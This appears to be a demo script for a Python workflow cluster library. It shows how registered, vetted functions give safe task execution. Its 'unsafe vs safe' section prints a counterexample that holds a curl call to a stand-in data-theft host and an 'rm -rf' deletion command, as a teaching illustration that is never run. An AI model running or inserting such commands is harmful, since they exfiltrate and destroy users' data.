#!/usr/bin/env python3
"""
Secure Python Function Demo

Shows how to safely execute Python tasks using function registration
instead of arbitrary code execution.
"""

import asyncio
import sys
import json
from pathlib import Path
from typing import List, Dict, Any

# Add package to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from gleitzeit_cluster.core.cluster import GleitzeitCluster
from gleitzeit_cluster.core.workflow import Workflow
from gleitzeit_cluster.core.task import Task, TaskType
from gleitzeit_cluster.execution.python_executor import PythonExecutor


# ======================
# SECURE FUNCTION LIBRARY
# ======================

def fibonacci_sequence(n: int) -> List[int]:
    """Calculate Fibonacci sequence up to n terms - SAFE"""
    if n <= 0:
        return []
    elif n == 1:
        return [0]
    elif n == 2:
        return [0, 1]
    
    sequence = [0, 1]
    for i in range(2, n):
        sequence.append(sequence[i-1] + sequence[i-2])
    
    return sequence


def analyze_numbers(numbers: List[int]) -> Dict[str, Any]:
    """Analyze a list of numbers - SAFE"""
    if not numbers:
        return {"error": "Empty list provided"}
    
    return {
        "count": len(numbers),
        "sum": sum(numbers),
        "average": sum(numbers) / len(numbers),
        "min": min(numbers),
        "max": max(numbers),
        "sorted": sorted(numbers),
        "unique_count": len(set(numbers))
    }


def text_stats(text: str) -> Dict[str, Any]:
    """Calculate text statistics - SAFE"""
    if not text:
        return {"error": "Empty text provided"}
    
    words = text.split()
    
    return {
        "character_count": len(text),
        "word_count": len(words),
        "line_count": len(text.split('\n')),
        "average_word_length": sum(len(word) for word in words) / len(words) if words else 0,
        "longest_word": max(words, key=len) if words else "",
        "unique_words": len(set(word.lower() for word in words))
    }


async def async_data_processing(data: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Process structured data asynchronously - SAFE"""
    await asyncio.sleep(0.1)  # Simulate async work
    
    if not data:
        return {"error": "No data provided"}
    
    # Safe processing only
    total_records = len(data)
    fields = set()
    
    for record in data:
        if isinstance(record, dict):
            fields.update(record.keys())
    
    return {
        "total_records": total_records,
        "unique_fields": list(fields),
        "field_count": len(fields),
        "processed_at": "async_processor"
    }


def factorial(n: int) -> int:
    """Calculate factorial - SAFE with bounds checking"""
    if n < 0:
        raise ValueError("Factorial not defined for negative numbers")
    if n > 20:  # Prevent huge calculations
        raise ValueError("Number too large (max 20)")
    
    if n <= 1:
        return 1
    return n * factorial(n - 1)


# ======================
# SECURE WORKFLOW DEMO
# ======================

async def demo_secure_python_workflows():
    """Demonstrate secure Python execution with registered functions"""
    print("🔒 Secure Python Function Execution Demo")
    print("=" * 50)
    
    # Create cluster with function registration
    cluster = GleitzeitCluster(
        enable_real_execution=True,
        enable_redis=False,
        enable_socketio=False
    )
    
    try:
        await cluster.start()
        print("✅ Cluster started")
        
        # Register secure functions
        if hasattr(cluster.task_executor, 'python_executor'):
            python_executor = cluster.task_executor.python_executor
            
            # Register our safe function library
            python_executor.register_functions({
                "fibonacci": fibonacci_sequence,
                "analyze_numbers": analyze_numbers,
                "text_stats": text_stats,
                "process_data": async_data_processing,
                "factorial": factorial
            })
            
            registered = python_executor.list_registered_functions()
            print(f"🔧 Registered {len(registered)} secure functions:")
            for func_name in registered:
                print(f"   • {func_name}")
        
        print()
        
        # Create secure workflow
        workflow = Workflow(
            name="secure_python_demo",
            description="Secure Python function execution"
        )
        
        # Task 1: Generate Fibonacci sequence
        fib_task = Task(
            name="fibonacci_calculation",
            task_type=TaskType.PYTHON_FUNCTION,
            parameters={
                'function_name': 'fibonacci',
                'args': [10],  # Calculate first 10 Fibonacci numbers
                'timeout': 30
            }
        )
        workflow.add_task(fib_task)
        
        # Task 2: Analyze the results
        analyze_task = Task(
            name="number_analysis",
            task_type=TaskType.PYTHON_FUNCTION,
            parameters={
                'function_name': 'analyze_numbers',
                'args': [[1, 1, 2, 3, 5, 8, 13, 21, 34, 55]],  # Fibonacci results
                'timeout': 30
            },
            dependencies=[fib_task.id]
        )
        workflow.add_task(analyze_task)
        
        # Task 3: Text analysis
        text_task = Task(
            name="text_analysis",
            task_type=TaskType.PYTHON_FUNCTION,
            parameters={
                'function_name': 'text_stats',
                'args': ["The quick brown fox jumps over the lazy dog. This sentence contains every letter of the alphabet."],
                'timeout': 30
            }
        )
        workflow.add_task(text_task)
        
        # Task 4: Async data processing
        data_task = Task(
            name="async_processing",
            task_type=TaskType.PYTHON_FUNCTION,
            parameters={
                'function_name': 'process_data',
                'args': [[
                    {"name": "Alice", "age": 25, "city": "New York"},
                    {"name": "Bob", "age": 30, "city": "San Francisco"},
                    {"name": "Charlie", "age": 35, "city": "Chicago"}
                ]],
                'timeout': 30
            }
        )
        workflow.add_task(data_task)
        
        # Task 5: Factorial calculation
        factorial_task = Task(
            name="factorial_calculation", 
            task_type=TaskType.PYTHON_FUNCTION,
            parameters={
                'function_name': 'factorial',
                'args': [8],
                'timeout': 30
            }
        )
        workflow.add_task(factorial_task)
        
        print(f"📋 Created secure workflow with {len(workflow.tasks)} tasks")
        
        # Execute workflow
        print("⚡ Executing secure workflow...")
        result = await cluster.execute_workflow(workflow)
        
        print(f"✅ Secure workflow completed: {result.status}")
        print(f"📊 Results: {len(result.results)} task result(s)")
        print()
        
        # Show results
        for task_id, task_result in result.results.items():
            task_name = next((t.name for t in workflow.tasks.values() if t.id == task_id), task_id)
            print(f"📄 {task_name}:")
            if isinstance(task_result, dict):
                print(f"   {json.dumps(task_result, indent=3)}")
            else:
                print(f"   {task_result}")
            print()
        
        print("🔒 Security Benefits Demonstrated:")
        print("   ✅ No arbitrary code execution")
        print("   ✅ Predefined, audited functions only") 
        print("   ✅ Input validation and bounds checking")
        print("   ✅ Controlled resource usage")
        print("   ✅ Safe error handling")
        
    except Exception as e:
        print(f"❌ Demo failed: {e}")
        import traceback
        traceback.print_exc()
    
    finally:
        await cluster.stop()
        print("✅ Cluster stopped")


async def demo_unsafe_vs_safe():
    """Show the difference between unsafe and safe approaches"""
    print("\n🚨 Unsafe vs Safe Comparison")
    print("=" * 40)
    
    print("❌ UNSAFE (what we DON'T do):")
    print("""
    task = Task(
        task_type=TaskType.PYTHON_CODE,
        parameters={
            'code': '''
            import os
            import subprocess
            # 💥 DANGEROUS: Arbitrary system access!
            os.system("curl malicious-site.com/steal-data")
            subprocess.run(["rm", "-rf", "/important-files"])
            '''
        }
    )
    """)
    
    print("✅ SAFE (what we DO):")
    print("""
    # 1. Register vetted, secure functions
    executor.register_function("safe_calc", safe_calculation_function)
    
    # 2. Use only registered functions
    task = Task(
        task_type=TaskType.PYTHON_FUNCTION,
        parameters={
            'function_name': 'safe_calc',  # Only approved functions
            'args': [2, 3],               # Validated inputs
        }
    )
    """)
    
    print("\n🔒 Security Layers:")
    print("   1. 🚫 No eval()/exec() of user code")
    print("   2. 📚 Function whitelist (registry)")  
    print("   3. 🛡️  Input validation")
    print("   4. ⏱️  Timeout protection")
    print("   5. 🔍 Audit logging")
    print("   6. 💾 Resource limits")


async def main():
    """Run secure Python demo"""
    print("🔐 Gleitzeit Secure Python Execution")
    print("=" * 60)
    print("Demonstrating safe Python task execution using")
    print("function registration instead of arbitrary code")
    print()
    
    await demo_secure_python_workflows()
    await demo_unsafe_vs_safe()
    
    print(f"\n🎯 Key Takeaway:")
    print("Function registration provides security, auditability,")
    print("and maintainability while still enabling powerful")
    print("Python-based workflow automation!")


if __name__ == "__main__":
    asyncio.run(main())